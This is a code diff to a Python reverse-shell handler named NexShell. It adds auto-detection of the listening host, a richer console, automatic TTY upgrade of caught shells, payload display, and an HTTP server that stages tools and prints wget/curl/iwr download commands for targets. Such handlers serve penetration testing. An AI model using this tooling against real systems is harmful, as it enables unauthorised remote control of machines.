@@ -137,6 +137,120 @@ def _load_ui():
     return _ui
 
 
+# ── Professional REPL (optional — prompt_toolkit + Rich) ─────────────────
+try:
+    from prompt_toolkit                 import PromptSession as _PTSession
+    from prompt_toolkit.history         import FileHistory   as _PTHistory
+    from prompt_toolkit.auto_suggest    import AutoSuggestFromHistory as _PTSuggest
+    from prompt_toolkit.completion      import Completer as _PTCompleter, Completion as _PTCompletion
+    from prompt_toolkit.styles          import Style as _PTStyle
+    from prompt_toolkit.formatted_text  import HTML as _PTHTML
+    HAS_PROMPT_TOOLKIT = True
+except ImportError:
+    HAS_PROMPT_TOOLKIT = False
+
+try:
+    from rich.console   import Console  as _RichConsole
+    from rich.panel     import Panel    as _RichPanel
+    from rich.text      import Text     as _RichText
+    from rich           import box      as _rich_box
+    from rich.table     import Table    as _RichTable
+    HAS_RICH = True
+    _rcon = _RichConsole(highlight=False)
+except ImportError:
+    HAS_RICH = False
+    _rcon = None
+
+
+# ── System / LHOST detection ─────────────────────────────────────────────
+def _get_lhost() -> str:
+    """Return the best non-loopback IPv4 address of this machine."""
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        pass
+    try:
+        return socket.gethostbyname(socket.gethostname())
+    except Exception:
+        return "127.0.0.1"
+
+def _detect_shell() -> str:
+    """Detect the shell/terminal the operator is using."""
+    # Windows PowerShell / cmd
+    if IS_WINDOWS:
+        ps = os.environ.get('PSVersionTable', '')
+        if os.environ.get('PSModulePath'):
+            ver = subprocess.run(
+                ["powershell", "-NoProfile", "-Command", "$PSVersionTable.PSVersion.Major"],
+                capture_output=True, text=True, timeout=3
+            )
+            ver = ver.stdout.strip() if not ver.returncode else '?'
+            return f"PowerShell {ver}"
+        if os.environ.get('ComSpec', '').lower().endswith('cmd.exe'):
+            return "cmd.exe"
+        return "Windows Terminal" if os.environ.get('WT_SESSION') else "unknown"
+    # Unix
+    shell = os.environ.get('SHELL', '')
+    if 'zsh'  in shell: return 'zsh'
+    if 'bash' in shell: return 'bash'
+    if 'fish' in shell: return 'fish'
+    if shell:           return os.path.basename(shell)
+    return 'unknown'
+
+def _detect_terminal() -> str:
+    """Best-effort terminal name detection."""
+    checks = [
+        ('WT_SESSION',    'Windows Terminal'),
+        ('TERM_PROGRAM',  None),           # value is the name
+        ('TERM',          None),
+        ('COLORTERM',     None),
+    ]
+    for env, label in checks:
+        v = os.environ.get(env)
+        if v:
+            return label or v
+    if IS_WINDOWS:
+        return 'conhost'
+    return 'unknown'
+
+def _get_all_local_ips() -> list:
+    """Return all non-loopback IPv4 addresses."""
+    ips = []
+    try:
+        for iface, addrs in socket.getaddrinfo(socket.gethostname(), None):
+            pass
+    except Exception:
+        pass
+    try:
+        import subprocess as _sp
+        if IS_WINDOWS:
+            out = _sp.run(['ipconfig'], capture_output=True, text=True, timeout=5).stdout
+            for line in out.splitlines():
+                if 'IPv4' in line and ':' in line:
+                    ip = line.split(':')[-1].strip()
+                    if ip and not ip.startswith('127'):
+                        ips.append(ip)
+        else:
+            out = _sp.run(['ip', '-4', 'addr', 'show'], capture_output=True,
+                          text=True, timeout=5).stdout
+            import re as _re
+            for m in _re.finditer(r'inet (\d+\.\d+\.\d+\.\d+)', out):
+                ip = m.group(1)
+                if not ip.startswith('127'):
+                    ips.append(ip)
+    except Exception:
+        pass
+    if not ips:
+        ips = [_get_lhost()]
+    return list(dict.fromkeys(ips))  # dedup preserve order
+
+
+
+
 rand              = lambda _len: ''.join(choice(ascii_letters) for i in range(_len))
 caller            = lambda: inspect.stack()[2].function
 chunks            = lambda s, n: (s[0+i:n+i] for i in range(0, len(s), n))
@@ -242,6 +356,15 @@ class Options:
         self.stealth_mode            = False      # anti-forensics, no disk writes on target
         self.auto_enum               = False      # auto-run QuickEnum on new sessions
         self.shell_quality           = True       # show shell quality score on connect
+        # ── v2.2 additions ────────────────────────────────────────────────────
+        self.lhost                   = '0.0.0.0'  # auto-detected at startup
+        self.lhost_all               = []         # all local IPs
+        self.shell_type              = 'unknown'  # operator shell (bash/zsh/powershell/cmd)
+        self.terminal_type           = 'unknown'  # operator terminal (WT/xterm/conhost)
+        self.auto_tty                = True       # auto TTY-upgrade new sessions
+        self.auto_share              = False      # auto-start file share server at launch
+        self.share_port              = 9001       # HTTP share server port
+        self._share_server           = None       # running share server ref
 
 options = Options()
 
@@ -1142,6 +1265,31 @@ class Session:
             except Exception as e:
                 logger.debug(f"Auto-run plugin fallback failed: {e}")
 
+        # ── v2.2: Auto TTY upgrade ─────────────────────────────────────────
+        if options.auto_tty and self.OS == 'Linux' and not options.no_upgrade:
+            def _auto_tty_bg():
+                time.sleep(1.5)  # wait for session to stabilise
+                try:
+                    import importlib
+                    mod = importlib.import_module('plugins.smart_tty_upgrade')
+                    cls = next(
+                        (getattr(mod, a) for a in dir(mod)
+                         if isinstance(getattr(mod, a), type)
+                         and hasattr(getattr(mod, a), 'run')
+                         and getattr(mod, a).__module__ == mod.__name__),
+                        None
+                    )
+                    if cls:
+                        logger.info(f"[AUTO-TTY] Upgrading session [{self.id}] shell…")
+                        cls().run(self, [])
+                except Exception as _te:
+                    logger.debug(f"Auto-TTY failed for [{self.id}]: {_te}")
+            threading.Thread(
+                target=_auto_tty_bg,
+                name=f"AutoTTY-{self.id}",
+                daemon=True
+            ).start()
+
     def fileno(self): return self.socket.fileno()
 
     @property
@@ -1396,15 +1544,102 @@ class BetterCMD:
         self.lastcmd   = ''
         self.active    = threading.Event()
         self.stop      = False
+        self._pt_session = None  # prompt_toolkit session (created lazily)
 
     def show(self): print(); self.active.set()
 
+    def _build_pt_session(self):
+        """Create prompt_toolkit PromptSession with NexShell autocomplete."""
+        if not HAS_PROMPT_TOOLKIT:
+            return None
+        try:
+            from datetime import datetime, timezone as _tz
+
+            class _NexCompleter(_PTCompleter):
+                def get_completions(self, document, complete_event):
+                    from prompt_toolkit.completion import Completion
+                    word = document.get_word_before_cursor()
+                    text = document.text_before_cursor.lstrip()
+                    parts = text.split()
+                    # top-level commands
+                    if not parts or (len(parts) == 1 and not text.endswith(" ")):
+                        cmds = [a[3:] for a in dir(self._menu) if a.startswith('do_')]
+                        for c in sorted(cmds):
+                            if c.startswith(word):
+                                yield Completion(c, start_position=-len(word))
+                        return
+                    # plugin sub-completions
+                    if parts[0] == 'plugins':
+                        for n in _list_plugin_names():
+                            if n.startswith(word):
+                                yield Completion(n, start_position=-len(word))
+
+                def bind_menu(self, menu):
+                    self._menu = menu
+                    return self
+
+            completer = _NexCompleter()
+
+            hist_dir  = Path(options.basedir) / "history"
+            hist_dir.mkdir(parents=True, exist_ok=True)
+
+            style = _PTStyle.from_dict({
+                "nexshell"   : "#58a6ff bold",
+                "bracket"    : "#8b949e",
+                "session_on" : "#3fb950 bold",
+                "arrow"      : "#58a6ff bold",
+                "completion-menu.completion"         : "bg:#21262d #c9d1d9",
+                "completion-menu.completion.current" : "bg:#388bfd #ffffff bold",
+            })
+
+            def _toolbar():
+                from datetime import datetime, timezone as _tz
+                ts      = datetime.now(_tz.utc).strftime("%H:%M UTC")
+                nsess   = len(core.sessions) if hasattr(core, 'sessions') else 0
+                nlisten = len([r for r in (core.rlist if hasattr(core,'rlist') else [])
+                               if hasattr(r, 'fileno') and not hasattr(r, 'shell_response_buf')])
+                plugins = len(_list_plugin_names())
+                lhost   = options.lhost
+                return _PTHTML(
+                    f' <b>NexShell</b> {__version__}'
+                    f'  │  <b>sessions:</b> {nsess}'
+                    f'  <b>lhost:</b> {lhost}'
+                    f'  <b>plugins:</b> {plugins}'
+                    f'  │  {ts}'
+                )
+
+            sess = _PTSession(
+                history              = _PTHistory(str(hist_dir / "nexshell_history")),
+                completer            = completer,
+                auto_suggest         = _PTSuggest(),
+                style                = style,
+                complete_while_typing= True,
+                bottom_toolbar       = _toolbar,
+                mouse_support        = False,
+            )
+            sess._nexcompleter = completer
+            return sess
+        except Exception as e:
+            logger.debug(f"prompt_toolkit session init failed: {e}")
+            return None
+
     def start(self):
         if self.banner: print(self.banner)
+        # Build prompt_toolkit session once
+        if self._pt_session is None:
+            self._pt_session = self._build_pt_session()
         while not self.stop:
             try:
                 self.active.wait()
-                line = self.cmdqueue.pop(0) if self.cmdqueue else input(self.prompt)
+                if self.cmdqueue:
+                    line = self.cmdqueue.pop(0)
+                elif self._pt_session:
+                    # Bind completer to current menu so it knows the do_* commands
+                    if hasattr(self._pt_session, '_nexcompleter') and hasattr(self, '_menu_ref'):
+                        self._pt_session._nexcompleter.bind_menu(self._menu_ref)
+                    line = self._pt_session.prompt(self.prompt or "> ")
+                else:
+                    line = input(self.prompt)
                 line = self.precmd(line)
                 stop = self.onecmd(line)
                 stop = self.postcmd(stop, line)
@@ -2321,22 +2556,33 @@ class MainMenu(BetterCMD):
                 cmdlogger.warning("No active listeners")
 
     def do_payloads(self, line):
-        """[interface] [--obfuscate] [--linux|--windows|--all] — Generate payloads"""
+        """[interface|LHOST] [--obfuscate] [--linux|--windows|--all] — Generate payloads"""
         line = line or ''
         obf  = '--obfuscate' in line
         if '--windows' in line: target_os = 'windows'
         elif '--linux' in line: target_os = 'linux'
         else:                   target_os = 'all'
-        iface = line.replace('--obfuscate','').replace('--windows','').replace('--linux','').replace('--all','').strip()
+        iface = (line
+                 .replace('--obfuscate', '').replace('--windows', '')
+                 .replace('--linux', '').replace('--all', '').strip())
+
         if core.listeners:
             for l in core.listeners.values():
-                host = Interfaces().translate(iface) if iface else l.host
-                if host == '0.0.0.0':
-                    ips = Interfaces().ips
-                    host = ips[0] if ips else '0.0.0.0'
+                if iface:
+                    host = Interfaces().translate(iface)
+                else:
+                    # v2.2: use auto-detected LHOST
+                    host = options.lhost if options.lhost != '0.0.0.0' else None
+                    if not host or host == '0.0.0.0':
+                        ips = Interfaces().ips
+                        host = ips[0] if ips else '0.0.0.0'
                 PayloadGenerator.display(host, l.port, obfuscate=obf, target_os=target_os)
         else:
-            cmdlogger.warning("No active listeners — start one first")
+            # No listener — show payloads with LHOST and default port
+            host = options.lhost if options.lhost != '0.0.0.0' else '0.0.0.0'
+            port = options.ports[0] if options.ports else 4444
+            cmdlogger.info(f"No active listeners — showing payloads for {host}:{port}")
+            PayloadGenerator.display(host, port, obfuscate=obf, target_os=target_os)
 
     def do_connect(self, line):
         """<Host> <Port> — Connect to a bind shell"""
@@ -2358,20 +2604,39 @@ class MainMenu(BetterCMD):
         print(paint(folder).yellow)
 
     def do_SET(self, line):
-        """[option] [value] — Show/set options"""
+        """[option] [value] — Show/set options. SET LHOST auto | SET LHOST <ip>"""
         if not line:
-            rows = [[paint(k).teal, paint(repr(v)).yellow] for k,v in options.__dict__.items()]
-            tbl  = Table(rows, fillchar=[paint('.').darkgrey, 0], joinchar=' => ')
+            # Show key options prominently
+            print(f"\n  {paint('LHOST').teal}  =>  {paint(options.lhost).lime}")
+            if len(options.lhost_all) > 1:
+                print(f"  {paint('all IPs').darkgrey} =>  {paint(', '.join(options.lhost_all)).yellow}")
+            print(f"  {paint('Shell').teal}  =>  {paint(options.shell_type).yellow}")
+            print(f"  {paint('Term').teal}   =>  {paint(options.terminal_type).yellow}")
+            print()
+            rows = [[paint(k).teal, paint(repr(v)).yellow] for k, v in options.__dict__.items()
+                    if not k.startswith('_') and k not in ('lhost_all',)]
+            tbl = Table(rows, fillchar=[paint('.').darkgrey, 0], joinchar=' => ')
             print(tbl)
         else:
             parts = line.split(' ', 1)
+            key   = parts[0]
+            # Special: SET LHOST auto | SET LHOST <ip>
+            if key.upper() == 'LHOST':
+                if len(parts) == 1 or parts[1].strip().lower() == 'auto':
+                    options.lhost_all = _get_all_local_ips()
+                    options.lhost     = options.lhost_all[0] if options.lhost_all else _get_lhost()
+                    logger.info(f"LHOST auto-detected: {paint(options.lhost).lime}")
+                else:
+                    options.lhost = parts[1].strip()
+                    logger.info(f"LHOST set to: {paint(options.lhost).lime}")
+                return
             try:
                 if len(parts) == 1:
-                    print(paint(repr(getattr(options, parts[0]))).yellow)
+                    print(paint(repr(getattr(options, key))).yellow)
                 else:
                     from ast import literal_eval
-                    setattr(options, parts[0], literal_eval(parts[1]))
-                    logger.info(f"'{parts[0]}' = {paint(repr(getattr(options, parts[0]))).yellow}")
+                    setattr(options, key, literal_eval(parts[1]))
+                    logger.info(f"'{key}' = {paint(repr(getattr(options, key))).yellow}")
             except AttributeError: cmdlogger.error("No such option")
             except Exception as e: cmdlogger.error(f"{type(e).__name__}: {e}")
 
@@ -3822,6 +4087,61 @@ def build_parser():
 #  WINDOWS UTF-8 STDOUT FIX
 # ══════════════════════════════════════════════════════════════════════════════
 
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  AUTO TOOLS SHARE SERVER
+# ══════════════════════════════════════════════════════════════════════════════
+def _start_tools_share(port: int = None, background: bool = True):
+    """Start HTTP server serving tools/ directory. Auto-finds free port 9001-9100."""
+    import http.server, socketserver as _ss
+
+    tools_dir = Path(_NEXSHELL_DIR) / "tools"
+    tools_dir.mkdir(exist_ok=True)
+
+    # Find a free port in 9001-9100
+    chosen = port or options.share_port
+    for p in range(chosen, 9101):
+        try:
+            s = socket.socket(); s.bind(("0.0.0.0", p)); s.close()
+            chosen = p; break
+        except OSError:
+            continue
+
+    options.share_port = chosen
+
+    class _Handler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *a, **kw):
+            super().__init__(*a, directory=str(tools_dir), **kw)
+        def log_message(self, fmt, *a):
+            ts = time.strftime("%H:%M:%S")
+            logger.info(f"[SHARE] {self.client_address[0]}  {fmt % a}")
+
+    lhost = options.lhost
+    urls  = [f"http://{ip}:{chosen}/<file>" for ip in (options.lhost_all or [lhost])]
+
+    def _serve():
+        _ss.TCPServer.allow_reuse_address = True
+        with _ss.TCPServer(("0.0.0.0", chosen), _Handler) as srv:
+            options._share_server = srv
+            logger.info(paint(f"[SHARE] Tools server started → port {chosen}").lime)
+            for u in urls:
+                logger.info(f"  [SHARE] {paint(u).teal}")
+            logger.info(f"  [SHARE] wget  http://{lhost}:{chosen}/<tool>")
+            logger.info(f"  [SHARE] curl  http://{lhost}:{chosen}/<tool>")
+            logger.info(f"  [SHARE] iwr   'http://{lhost}:{chosen}/<tool>' -OutFile <tool>")
+            try:
+                srv.serve_forever()
+            except Exception:
+                pass
+
+    if background:
+        t = Thread(target=_serve, name="ToolsShare", daemon=True)
+        t.start()
+        return t
+    else:
+        _serve()
+
+
 # ══════════════════════════════════════════════════════════════════════════════
 #  STARTUP BANNER
 # ══════════════════════════════════════════════════════════════════════════════
@@ -3834,29 +4154,83 @@ def print_banner():
             if "Nexus of Shell Operations" in line:
                 print(f"              {paint('Nexus of Shell Operations').teal}  ·  {paint('Elite Reverse Shell Commander').lime}")
             else:
-                if idx % 2 == 0:
-                    print(paint(line).red)
-                else:
-                    print(paint(line).white)
+                print(paint(line).red if idx % 2 == 0 else paint(line).white)
     except (UnicodeEncodeError, UnicodeDecodeError):
         safe = __banner__.encode('ascii', errors='replace').decode()
-        lines = safe.splitlines()
-        for idx, line in enumerate(lines):
+        for idx, line in enumerate(safe.splitlines()):
             if idx == 0 and not line.strip():
                 continue
             if "Nexus of Shell Operations" in line:
                 print(f"              {paint('Nexus of Shell Operations').teal}  ·  {paint('Elite Reverse Shell Commander').lime}")
             else:
-                if idx % 2 == 0:
-                    print(paint(line).red)
-                else:
-                    print(paint(line).white)
+                print(paint(line).red if idx % 2 == 0 else paint(line).white)
+
+    # Version line
     print(f"  {paint('Version').teal} {paint(__version__).lime}  "
           f"{paint('*').darkgrey}  "
           f"{paint('by').teal} {paint(__author__).orange}  "
           f"{paint('*').darkgrey}  "
           f"Platform: {paint('Windows' if IS_WINDOWS else platform.system()).cyan}  "
           f"Escape: {paint(options.escape['key']).yellow}\n")
+
+    # ── System Info Box ───────────────────────────────────────────────────
+    _print_sysinfo_box()
+
+
+def _print_sysinfo_box():
+    """Print operator system info with LHOST prominently displayed."""
+    lhost   = options.lhost
+    all_ips = options.lhost_all
+    os_name = platform.system() + ' ' + platform.release()
+    shell   = options.shell_type
+    term    = options.terminal_type
+    plugins = len(_list_plugin_names())
+
+    if HAS_RICH and _rcon:
+        from rich.table import Table as _T
+        from rich       import box   as _B
+        t = _T(show_header=False, box=_B.ROUNDED, border_style="bright_blue",
+               padding=(0, 2), expand=False)
+        t.add_column("k", style="dim",          width=14)
+        t.add_column("v", style="bright_white")
+        t.add_row("LHOST",    f"[bold bright_green]{lhost}[/]"
+                              + (f"  [dim]({', '.join(all_ips[1:])})[/]" if len(all_ips) > 1 else ""))
+        t.add_row("OS",       f"[cyan]{os_name}[/]")
+        t.add_row("Shell",    f"[yellow]{shell}[/]")
+        t.add_row("Terminal", f"[yellow]{term}[/]")
+        t.add_row("Plugins",  f"[bright_magenta]{plugins}[/]")
+        t.add_row("REPL",     "[bold bright_green]prompt_toolkit[/]" if HAS_PROMPT_TOOLKIT
+                              else "[dim]readline (pip install prompt_toolkit for autocomplete)[/]")
+        from rich.panel import Panel as _P
+        _rcon.print(_P(t, title="[bold bright_blue]System Info[/]",
+                       border_style="bright_blue", padding=(0, 1)))
+        _rcon.print()
+    else:
+        W = 58
+        sep = paint('─' * W).darkgrey
+        print(f"  {paint('╭' + '─'*W + '╮').darkgrey}")
+        def _row(k, v, vc='cyan'):
+            kp = paint(f"  {k:<12}").darkgrey
+            vp = getattr(paint(str(v)), vc)
+            pad = W - len(k) - len(str(v)) - 4
+            print(f"  {paint('│').darkgrey}{kp} {vp}{' '*max(0,pad)}{paint('│').darkgrey}")
+        _row('LHOST',    lhost,   'lime')
+        _row('OS',       os_name, 'cyan')
+        _row('Shell',    shell,   'yellow')
+        _row('Terminal', term,    'yellow')
+        _row('Plugins',  plugins, 'orange')
+        print(f"  {paint('╰' + '─'*W + '╯').darkgrey}\n")
+
+
+def _list_plugin_names() -> list:
+    """Return list of discovered plugin names (no import)."""
+    p = Path(_NEXSHELL_DIR) / "plugins"
+    if not p.exists():
+        return []
+    return [f.stem for f in sorted(p.glob("*.py"))
+            if not f.name.startswith("_")]
+
+
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -3884,7 +4258,18 @@ def main():
     ports = [int(p.strip()) for p in args.port.split(',')]
     options.ports = ports
 
+    # ── v2.2: Detect system info (LHOST, shell, terminal) ──────────────────
+    options.lhost_all    = _get_all_local_ips()
+    options.lhost        = options.lhost_all[0] if options.lhost_all else _get_lhost()
+    options.shell_type   = _detect_shell()
+    options.terminal_type= _detect_terminal()
+
     print_banner()
+
+    # ── v2.2: Auto file-share server (tools/) ──────────────────────────────
+    if getattr(args, 'auto_share', False):
+        options.auto_share = True
+        _start_tools_share(background=True)
 
     # -- Load plugins
     try:
